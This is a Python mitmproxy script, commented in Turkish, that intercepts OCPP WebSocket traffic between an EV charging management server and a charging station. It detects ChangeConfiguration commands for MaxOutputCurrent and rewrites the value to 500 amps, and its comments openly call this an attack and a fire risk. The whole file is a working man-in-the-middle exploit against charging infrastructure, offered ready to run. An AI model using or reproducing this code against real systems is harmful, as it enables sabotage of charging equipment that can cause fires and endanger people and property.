# mitm_modify_ws.py (GÜNCELLENMİŞ VE DÜZELTİLMİŞ VERSİYON)
from mitmproxy import ctx
import json

class WebSocketModifier:
    def websocket_message(self, flow):
        # YENİ VERSİYON DÜZELTMESİ:
        # flow.message yerine flow.websocket.messages[-1] kullanıyoruz.
        # Bu, o an gelen son mesajı temsil eder.
        if flow.websocket.messages:
            msg = flow.websocket.messages[-1]
        else:
            return

        # Sadece Text mesajları (Type 1) ve Sunucudan gelenleri (from_client=False) işle
        # Çünkü "ChangeConfiguration" emri Sunucudan (CSMS) -> İstasyona (CP) gider.
        if not msg.from_client and msg.type == 1:
            try:
                # Mesaj içeriğini al (bytes olabilir, decode ediyoruz)
                message_content = msg.content
                if isinstance(message_content, bytes):
                    message_content = message_content.decode('utf-8')

                data = json.loads(message_content)

                # OCPP Mesaj Yapısı: [MessageType, UniqueID, Action, Payload]
                # Hedefimiz: ChangeConfiguration komutu
                if isinstance(data, list) and len(data) > 3 and data[2] == "ChangeConfiguration":
                    payload = data[3]
                    
                    # Eğer değiştirilmek istenen ayar "MaxOutputCurrent" ise...
                    if payload.get("key") == "MaxOutputCurrent":
                        original_val = payload.get("value")
                        ctx.log.warn(f"[MITM] >>> YAKALANDI: Güvenli Akım Değeri: {original_val}A")

                        # --- SALDIRI BAŞLIYOR ---
                        # Değeri 500 Amper'e (YANGIN RİSKİ) çekiyoruz
                        data[3]["value"] = "500"
                        
                        new_payload_str = json.dumps(data)
                        
                        # Manipüle edilmiş mesajı yerine koy
                        msg.text = new_payload_str

                        ctx.log.warn(f"[MITM] <<< MANİPÜLE EDİLDİ: YENİ DEĞER 500A (YANGIN RİSKİ!)")

            except Exception as e:
                ctx.log.error(f"[MITM] Hata: {e}")

addons = [WebSocketModifier()]
